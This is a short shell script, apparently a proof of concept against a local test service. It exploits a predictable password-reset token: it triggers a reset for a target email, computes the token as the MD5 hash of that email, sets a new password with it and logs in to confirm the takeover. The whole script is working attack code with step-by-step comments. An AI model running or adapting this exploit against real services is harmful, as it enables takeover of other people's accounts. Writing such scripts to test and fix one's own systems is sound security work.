TARGET_EMAIL="4.6@example.com"
NEW_PASSWORD="NewPassViaPredictedToken"

# Make a request to /forget-password for the target email to populate the database with the token,
# but we do not use the response, we will try to predict it in the next step
curl -X 'POST' \
  'http://192.168.200.1:8082/auth/forgot-password' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d "{\"email\": \"$TARGET_EMAIL\"}" > /dev/null

# predict by computing the token that is just the md5 of the email
echo "\nTry to predict the reset password token for account with email $TARGET_EMAIL..."
TOKEN=$(echo -n "$TARGET_EMAIL" | md5sum | cut -d' ' -f1)
echo "Predicted token: $TOKEN"

# use it directly, bypassing the token that
# would be sent to the email via forgot-password
echo "\nTrying to reset password to a new one ($NEW_PASSWORD) using predicted token:"
curl -s -X POST http://192.168.200.1:8082/auth/reset-password \
  -H "Content-Type: application/json" \
  -d "{\"token\": \"$TOKEN\", \"new_password\": \"$NEW_PASSWORD\"}" | jq .

# verify by logging in with the new password
echo "\nVerify that the new password we set ($NEW_PASSWORD) works, by loggin in:"
curl -s -X POST http://192.168.200.1:8082/auth/login \
  -H "Content-Type: application/json" \
  -d "{\"email\": \"$TARGET_EMAIL\", \"password\": \"$NEW_PASSWORD\"}" | jq .
